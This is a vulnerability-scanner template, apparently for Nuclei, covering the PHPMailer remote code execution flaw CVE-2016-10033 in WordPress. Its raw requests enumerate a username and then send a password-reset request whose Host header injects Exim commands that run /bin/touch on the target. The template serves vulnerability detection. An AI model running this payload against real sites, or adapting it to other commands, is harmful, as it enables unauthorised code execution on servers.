id: CVE-2016-10033
info:
  name: WordPress PHPMailer < 5.2.18 Remote Code Execution
  author:
  - l0ne1y
  tags:
  - wordpress
  - cve
  - cve2016
  - rce
  description: |-
    PHPmail 'mailSend' 函数远程代码执行漏洞
    PHPMailer是一个用于发送电子邮件的PHP类库。

    PHPMailer 5.2.18之前的版本中的isMail transport的‘mailSend’函数存在安全漏洞，该漏洞源于程序没有设置Sender属性。远程攻击者可利用该漏洞向邮件命令中传递额外的参数，并执行任意代码。
  reference:
  - https://exploitbox.io/vuln/wordpress-exploit-4-6-rce-code-exec-cve-2016-10033.html
  - https://nvd.nist.gov/vuln/detail/cve-2016-10033
  - https://www.exploit-db.com/exploits/40970/
  - https://www.exploit-db.com/exploits/40968/
  severity: critical
  classification:
    cve-id:
    - cve-2016-10033
    cwe-id:
    - cwe-77
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  remediation: |-
    官方修复方案:
    1.目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接：
    https://github.com/PHPMailer/PHPMailer/releases/tag/v5.2.18
requests:
- matchers:
  - type: word
    part: header
    words:
    - wp-login.php?checkemail=confirm
  - type: status
    status:
    - 302
  extractors:
  - name: username
    type: regex
    regex:
    - Author:(?:[A-Za-z0-9 -\_="]+)?<span(?:[A-Za-z0-9 -\_="]+)?>([A-Za-z0-9]+)<\/span>
    group: 1
    part: body
    internal: true
  matchers-condition: and
  raw:
  - |+
    GET /?author=1 HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

  - |+
    POST /wp-login.php?action=lostpassword HTTP/1.1
    Host: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}success}} null)
    Accept: */*
    Content-Type: application/x-www-form-urlencoded

    wp-submit=Get+New+Password&redirect_to=&user_login={{username}}

  unsafe: true
